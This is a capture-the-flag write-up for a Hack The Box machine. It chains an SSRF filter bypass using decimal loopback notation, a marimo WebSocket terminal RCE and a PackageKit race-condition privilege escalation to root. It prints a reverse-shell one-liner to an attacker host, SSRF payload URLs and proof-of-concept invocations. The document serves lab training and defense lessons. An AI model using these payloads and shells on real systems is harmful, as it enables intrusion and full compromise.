# Cohort — Hack The Box

**Difficulty:** —
**OS:** Linux (Ubuntu 24.04)
**Date:** 2026-08-25
**Target:** `cohort.htb`

## Summary

Cohort is a Linux machine centered around a fictitious analytics SaaS ("Cohort Analytics"). The web application exposes a "Register a report source URL" form that fetches an attacker-supplied URL server-side, resulting in an **SSRF** vulnerability. The IP filter blocking internal/loopback addresses can be bypassed using decimal IP notation, which enabled internal port scanning and disclosure of an internal nginx status endpoint. That endpoint revealed a hidden internal vhost serving a **marimo** reactive Python notebook, vulnerable to a pre-authentication RCE (**CVE-2026-39987**) via an unauthenticated WebSocket terminal endpoint. From the resulting foothold, local privilege escalation to root was achieved via **Pack2TheRoot (CVE-2026-41651)**, a TOCTOU race condition in the PackageKit daemon that allows unprivileged users to install arbitrary packages as root.

## Reconnaissance

```bash
nmap -sC -sV <target-ip>
```

Relevant output:

```
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp  open  http     nginx 1.24.0 (Ubuntu) — redirects to https://cohort.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
```

The wildcard certificate (`*.cohort.htb`) was an early hint that internal subdomains/vhosts were relevant to the box, which later proved decisive.

`cohort.htb` was added to `/etc/hosts` and the site was browsed over HTTPS.

## Enumeration

The marketing site ("Cohort Analytics") includes a **Client Insights** page (`/portal.html`) with a form titled *"Register a report source URL"*, which:

- Accepts a **Source URL** and an **Expected format** (`CSV`, `JSON`, `NDJSON`, `Parquet`)
- Performs a server-side fetch of the URL to validate reachability and content type
- Explicitly states: *"For security, internal and loopback addresses are rejected"* and *"Validation does not import data. Reconciliation is a separate, scheduled step."*

Intercepting the form submission in the browser confirmed the backend call:

```
POST https://cohort.htb/api/validate
{"format": "csv", "url": "http://<attacker-ip>:8000/test.txt"}
```

Hosting a file with `python3 -m http.server` and submitting its URL confirmed an outbound server-side fetch — classic **SSRF**.

Directory brute-forcing (`gobuster`) against the site had to account for the SPA fallback (all unknown paths return HTTP 200 with an identical body), requiring `--exclude-length` filtering on the fallback response size.

## SSRF — Internal Recon and Filter Bypass

Submitting `127.0.0.1` or `localhost` was rejected with *"Internal or loopback addresses are not permitted."* — a blacklist rather than a true network-layer restriction.

The filter was bypassed using **decimal IP notation**:

```
http://2130706433/          → resolves to 127.0.0.1
```

This was later confirmed to also accept the abbreviated form `http://127.1/`.

### Internal port scan via SSRF

Using the `/api/validate` endpoint as a blind port scanner (submitting the decimal loopback address with varying ports and inspecting the `fetched_status` / error message in the JSON response), the following internal services were identified:

| Port | Service |
|---|---|
| 22 | SSH (non-HTTP, fetch fails differently than "connection refused") |
| 80 | Same marketing SPA |
| 443 | Same nginx (plain HTTP hitting HTTPS port) |
| 5000 | Internal JSON API, `{"service": "cohort-insights"}` on `/health`, all other paths return `405 Method not allowed` (POST-only API) |
| 8888 | HTML login page for **marimo** (a reactive Python notebook server) — but not reachable directly from outside (only from localhost) |

### Disclosure of internal topology

Submitting `http://127.1/status` (an undocumented internal nginx status endpoint) returned a JSON payload disclosing the full upstream configuration:

```json
{
  "service": "cohort-edge",
  "upstreams": [
    {"name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort"},
    {"name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000"},
    {"name": "notebooks", "host": "nb-<hash>.cohort.htb", "target": "127.0.0.1:8888", "note": "internal analyst workspace, not for external use"}
  ]
}
```

This revealed a **hidden internal vhost** (`nb-<hash>.cohort.htb`) that nginx uses to route to the marimo notebook by `Host` header, explaining why the port 8888 fetch failed when connecting directly by IP (nginx requires SNI/Host matching that vhost).

> **Note on a parallel investigation path:** the `Parquet` format option in the source-validation form, combined with the "validation is separate from a scheduled reconciliation step" hint, strongly suggested a Parquet deserialization vulnerability (e.g. CVE-2025-30065 in Apache Parquet's `parquet-avro` Java module, or CVE-2023-47248 in PyArrow's `PyExtensionType` autoload). Malicious Parquet files were crafted and tested for both (Java-based SSRF canary via `javax.swing.JEditorPane`, and Python-based `os.system` callback via a malicious `PyExtensionType`), registered as sources, and left pending for the scheduled reconciliation job. Neither triggered a callback within the observation window. This path was not confirmed as part of the intended solution but is documented here as it consumed significant investigation time and is a plausible parallel attack surface depending on what backend the reconciliation job actually uses.

## Initial Access — CVE-2026-39987 (marimo pre-auth RCE)

With the internal vhost known, direct connection to the `443/tcp` port on the target IP, with SNI/Host set to `nb-<hash>.cohort.htb`, was used to reach the marimo instance through nginx.

`marimo` version `0.20.4` running behind that vhost is vulnerable to **CVE-2026-39987**: the `/terminal/ws` WebSocket endpoint spawns an OS pseudo-terminal without invoking the application's authentication check (`validate_auth()`), unlike the main `/ws` endpoint. Any client that completes the WebSocket handshake obtains a live interactive shell with no credentials.

A custom Python script (raw TLS socket + manual WebSocket framing) was used because standard `websocket-client`/`websockets` libraries had issues reliably negotiating the handshake with SNI-based routing in this environment:

```python
# Establish TLS connection directly to the target IP with SNI/Host
# set to the internal marimo vhost, perform the WebSocket upgrade
# handshake against /terminal/ws, then send/receive raw
# (client->server frames must be masked per RFC 6455).
```

After confirming the handshake (`HTTP/1.1 101 Switching Protocols`) and receiving the shell prompt over the WebSocket, a reverse shell was spawned and detached from the WebSocket's PTY session so it would survive the socket closing:

```bash
setsid nohup bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' </dev/null >/dev/null 2>&1 &
disown -a
```

This was necessary because the initial naive reverse shell died within seconds — it was a child of the WebSocket's PTY session and received `SIGHUP` when the exploit script closed the socket.

Result: stable reverse shell as user `marimo`.

## Privilege Escalation — CVE-2026-41651 (Pack2TheRoot)

Local enumeration on the `marimo` user identified `PackageKit 1.2.8` (`packagekitd`, running as root):

```bash
pkcon --version
dpkg -l | grep -i packagekit
systemctl status packagekit   # active, running as root
```

This version falls within the range affected by **Pack2TheRoot (CVE-2026-41651)**, a TOCTOU race condition disclosed by Deutsche Telekom's Red Team in April 2026. The vulnerability abuses GLib's D-Bus message dispatch priority: two asynchronous `InstallFiles()` calls are sent on the same transaction in quick succession — the first with `SIMULATE` flags (which bypasses PolicyKit authorization and queues a GLib idle callback), the second with `NONE` flags pointing at a malicious package. Because D-Bus messages are dispatched at a higher priority than idle callbacks, the second call's flags/paths overwrite the first's *before* the transaction actually executes, causing an unauthenticated package install to run as root — including post-install scriptlets.

A public Python proof-of-concept (a portable rewrite of the original C PoC) was used to validate and exploit the vulnerability:

```bash
python3 cve-2026-41651.py --check   # confirms 1.2.8 is in the vulnerable range
python3 cve-2026-41651.py           # builds two .deb packages, races the D-Bus calls,
                                     # drops a SUID bash via the payload package's postinst
```

The exploit builds a benign "dummy" `.deb` and a malicious "payload" `.deb` (whose postinst script drops a SUID root `bash` binary), races the two `InstallFiles()` D-Bus calls, and polls for the resulting SUID binary. Several attempts may be needed due to timing sensitivity; on success:

```
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
```

Root access achieved via the dropped SUID `bash`.

## Flags

- User: captured (redacted)
- Root: captured (redacted)

## Lessons Learned

- Blacklist-based SSRF protections that only pattern-match on `127.0.0.1`/`localhost` are trivially bypassed with alternate IP representations (decimal, octal, hex, `127.1`, IPv6 loopback, etc.). Always assume defenders need to normalize/resolve before comparing, not just string-match.
- An SSRF that only permits `GET` requests is still extremely valuable for internal recon: port scanning, reaching internal status/health/debug endpoints, and mapping upstream configuration (as happened here via an internal nginx status page) can be enough to pivot to a completely different vulnerability class.
- Wildcard TLS certificates (`*.domain.tld`) are a strong signal that internal vhost-based routing exists and is worth actively hunting for (via SSRF disclosure, vhost fuzzing, or certificate transparency logs in real-world engagements).
- Reactive/AI notebook tools (marimo, Jupyter, etc.) exposing terminal-over-WebSocket features are a growing and often under-scrutinized attack surface; authentication must be enforced consistently across *all* WebSocket routes, not just the primary one.
- Local privilege escalation research should not stop at `sudo -l` and SUID binaries — actively-running system daemons (like PackageKit here) are a valuable target class, especially for recently disclosed CVEs. Keeping a running checklist of "check daemon versions against recent CVEs" pays off.
- Not every plausible attack surface pans out: significant time was spent on a Parquet deserialization angle (both JVM- and Python-based) that, while technically sound and well-constructed, was not the intended path. That investigation is retained here as a documented negative result and as reusable technique/tooling for future engagements involving Parquet ingestion pipelines.

## References

- [GitHub Advisory: Marimo Pre-Auth RCE via Terminal WebSocket Authentication Bypass (CVE-2026-39987)](https://github.com/advisories/GHSA-2679-6mx9-h9xc)
- [Sysdig: Marimo OSS Python Notebook RCE — From Disclosure to Exploitation in Under 10 Hours](https://www.sysdig.com/blog/marimo-oss-python-notebook-rce-from-disclosure-to-exploitation-in-under-10-hours)
- [Deutsche Telekom Security: Pack2TheRoot (CVE-2026-41651)](https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html)
- [Hackers-Arise: Getting Started with Pack2TheRoot (CVE-2026-41651)](https://hackers-arise.com/privilege-escalation-getting-started-with-the-pack2theroot-cve-2026-41651-vulnerability-to-escalate-privileges/)
- [Apache Parquet CVE-2025-30065 advisory](https://github.com/advisories/GHSA-2c59-37c4-qrx5) (investigated, not the intended path)
- [PyArrow CVE-2023-47248 advisory](https://github.com/apache/arrow/security/advisories) (investigated, not the intended path)
